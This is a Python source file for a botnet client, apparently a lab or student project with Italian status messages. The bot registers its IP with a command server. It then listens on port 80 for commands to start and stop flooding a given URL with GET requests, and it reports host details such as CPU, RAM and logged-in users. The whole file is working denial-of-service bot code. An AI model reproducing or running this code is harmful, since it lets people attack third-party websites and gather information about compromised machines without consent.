import concurrent
import json
import platform
import socket
import threading
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler

import psutil
import requests

# server_address = ('10.0.2.15', 15200)
server_address = ('localhost', 15200)


class Bot(BaseHTTPRequestHandler):
    event = Event()

    def set_header(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def do_GET(self):
        if self.path == "/client-info":
            self.set_header()
            self.wfile.write(json.dumps(get_client_info()).encode('utf-8'))
        if self.path == "/stop-attack":
            self.event.set()
            self.set_header()
            self.wfile.write(json.dumps({'success': "Attacco fermato con successo"}).encode('utf-8'))

    def do_POST(self):
        if self.path == "/attack":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length).decode('utf-8'))

            t = threading.Thread(target=request_spam, args=(body['url'], self.event))
            t.daemon = True
            t.start()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))


def run():
    server = HTTPServer(('localhost', 80), Bot)
    server.serve_forever()


def get_client_info():
    return {
        "cpu": platform.processor(),
        "cpu_usage": psutil.cpu_percent(),
        "ram": round(psutil.virtual_memory().total / (1024.0 ** 3), 2),
        "ram_usage": psutil.virtual_memory().percent,
        "system": platform.system(),
        "cores": psutil.cpu_count(logical=False),
        "total_cores":  psutil.cpu_count(),
        "users": psutil.users(),
    }


def request_spam(url, e):
    try:
        while not e.is_set():
            res = requests.get(url)
            print(res)
    except Exception as e:
        print(e)


def initialize_bot():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_address[0], server_address[1]))
    s.send(f'My ip is {s.getsockname()[0]}'.encode('utf-8'))
    s.close()

    try:
        print("Bot initialized")
        with ThreadPoolExecutor(max_workers=3) as ex:
            x = ex.submit(run)
            concurrent.futures.wait([x], return_when=concurrent.futures.ALL_COMPLETED)

            ex.shutdown(wait=True)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    initialize_bot()